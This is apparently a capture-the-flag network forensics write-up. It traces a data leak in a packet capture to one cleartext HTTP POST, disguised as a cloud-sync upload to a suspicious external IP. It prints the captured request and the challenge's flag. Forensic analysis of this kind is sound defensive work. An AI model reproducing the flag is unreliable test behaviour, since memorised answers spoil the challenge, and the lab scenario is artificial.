## Challenge
capture.pcap holds a workday of traffic from a monitored workstation at a
design agency. Something that should not have left the network did. Find the
flag.

Flag: r00t{th3_cl0ud_sync_th4t_w4snt}


## 1. Tooling
No tshark/tcpdump was available, so the capture was parsed with Python scapy
(pip install scapy). File: libpcap 2.4, Ethernet, 3692 packets, spanning
2026-09-19 17:38:34 -> 17:40:08 UTC.


## 2. Triage - what is in the capture
Counting packets by (src, dst, proto, dst port):
  - ~650 UDP/53 packets: DNS from dozens of 10.42.x.x hosts to the resolver
    10.42.0.53
  - 1560 TCP/443 packets: short TLS sessions (about 3 packets, ~290 bytes
    each) from many internal hosts to public 52.x.x.x addresses - uniform
    background noise
  - 60 UDP/123 (NTP), ARP chatter, a handful of random high UDP ports
  - 7 TCP/80 packets and 5 packets on TCP/51823 - everything else is
    encrypted (443) or infrastructure, so the only cleartext application
    traffic stands out immediately.

Ranking flows by payload bytes, excluding DNS, put one odd flow at the top:
  10.42.17.203 -> 185.220.101.47 : TCP 80 (plain HTTP, not TLS)
Every other external flow is HTTPS to the 52.x.x.x range; this one is cleartext
HTTP to an unrelated address (185.220.101.x is commonly associated with Tor
exit infrastructure), so it is the exfiltration candidate.


## 3. Inspecting the suspicious stream
Stream: 10.42.17.203:51823 -> 185.220.101.47:80 (packets 2840-2851,
about 17:39:46 UTC). Full TCP handshake, one request/response, clean close.

Request (packet 2843/2845):
  POST /cloud-sync/upload?session=8f2e1a HTTP/1.1
  Host: sync.cloudbackup-service.net
  User-Agent: CloudSyncDesktop/4.2.1 (Windows NT 10.0; Win64; x64)
  Content-Type: multipart/form-data; boundary=BoundaryXyz19
  Content-Length: 389
  ... name="file"; filename="quarterly_designs_backup.txt"
  Content-Type: text/plain

  PROJECT ARCHIVE BACKUP -- INTERNAL USE ONLY
  This backup was auto-generated by CloudSync Desktop.
  recovery-token: r00t{th3_cl0ud_sync_th4t_w4snt}
  Do not distribute outside the design team.

Response (packet 2847):
  HTTP/1.1 200 OK  {"status":"ok","synced":true}

Why this is the leak:
  - A file marked "INTERNAL USE ONLY" was POSTed out of the network.
  - It is cloaked as a "CloudSync" desktop backup client, but the Host header
    (sync.cloudbackup-service.net) does not match the destination IP, and the
    server answered 200 "synced": the upload succeeded.
  - It went over unencrypted HTTP to a suspicious external IP while all
    ordinary traffic in the capture is HTTPS.
  - The source host is 10.42.17.203. Its only traffic in the capture is this
    one upload (ARP/DNS lookups of other hosts do not involve it).


## 4. Verification
A raw string search of the pcap for "r00t{" finds exactly one occurrence,
inside this POST body, so there are no competing flags.


## 5. Summary / indicators
